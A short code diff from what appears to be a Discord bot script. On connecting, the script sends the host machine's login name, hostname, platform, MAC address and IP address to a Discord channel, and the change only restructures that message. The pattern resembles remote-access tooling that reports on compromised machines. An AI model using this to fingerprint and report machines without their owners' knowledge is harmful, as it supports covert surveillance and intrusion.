@@ -22,13 +22,7 @@ info = '-'*64 + '\n' + os.getlogin() + ' | ' + platform.node() + '\n```' + 'plat
 async def on_ready():
     print(f'We have logged in as {client.user}')
     channel = client.get_channel(settings.channel)
-    await channel.send('**Connected!**\n```' +
-        os.getlogin() + ' | ' + platform.node() + '\n' +
-        'platform: ' + platform.platform() + '\n' +
-        'MAC: ' + str(getnode()) + '\n' +
-        'IP: ' + ip + '\n' +
-        '```'
-    )
+    await channel.send(info + '**Connected!**')
 
 @client.event
 async def on_message(message):
